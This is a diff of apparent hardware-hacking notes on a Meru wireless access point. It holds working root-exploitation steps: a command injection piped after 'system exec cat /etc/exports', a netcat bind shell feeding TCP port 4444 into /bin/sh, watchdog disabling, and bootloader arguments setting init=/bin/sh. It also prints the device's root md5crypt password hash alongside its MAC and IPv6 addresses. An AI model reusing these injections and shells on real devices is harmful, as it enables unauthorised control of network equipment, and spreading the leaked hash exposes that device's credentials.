@@ -1,17 +1,25 @@
-$1$oxduCrHo$3LQZUCnlYFmBtfsWFEJB11:11851:0:99999:7:::
 
-
-system exec cat /etc/exports | ps aux
-
-system exec cat /etc/exports | find / -iname Atsmain
-
-system exec cat /etc/exports | /bin/sh /etc/rc.d/rcS.runtime stop
+# become root for a few seconds
 system exec cat /etc/exports | killall Atsmain
 
-system exec cat /etc/exports | /bin/sh /etc/rc.d/rcS.runtime stop
-
+# pipe bytes received on a TCP socket to the bourne interpreter
 system exec cat /etc/exports | nc -l 4444 | /bin/sh
 
+# exec arbitrary commands
+system exec cat /etc/exports | ps aux
+system exec cat /etc/exports | find / -iname Atsmain
+system exec cat /etc/exports | /bin/sh /etc/rc.d/rcS.runtime stop
+system exec cat /etc/exports | echo "V" > /dev/watchdog
+
+# modify kernel params
+setenv setbootargs setenv bootargs root=$rootdev rw console=$console,$baudrate $othbootargs reboot=cold,hard emergency init=/bin/sh
+
+# eth0
+Ethernet: 00:0c:e6:0e:0e:9d
+Stateless auto-configuration address: fe80::20c:e6ff:fe0e:e9d/64
+
+# md5crypt
+$1$oxduCrHo$3LQZUCnlYFmBtfsWFEJB11
 
 ==Execute shell command: "cat //opt/meru/var/etc/odmap.conf"==:
 
@@ -65,20 +73,4 @@ MESH_DEBUG_ON=0
 ATS_REBOOT_REASON=8
 DISCOVERY_TYPE=BOOTUP
 ==End of Shell command output==
-
-
-system exec cat /etc/exports | echo "V" > /dev/watchdog
-
-
-setenv setbootargs setenv bootargs root=$rootdev rw console=$console,$baudrate $othbootargs reboot=cold,hard emergency init=/bin/sh
-
-ip6 on eth0 fe80::20c:e6ff:fe0e:e9d/64
-
-
-system exec cat /etc/exports | killall Atsmain
-
-link/ether 00:0c:e6:0e:0e:9d brd ff:ff:ff:ff:ff:ff
-
-root:$1$oxduCrHo$3LQZUCnlYFmBtfsWFEJB11:11851:0:99999:7:::
-
 
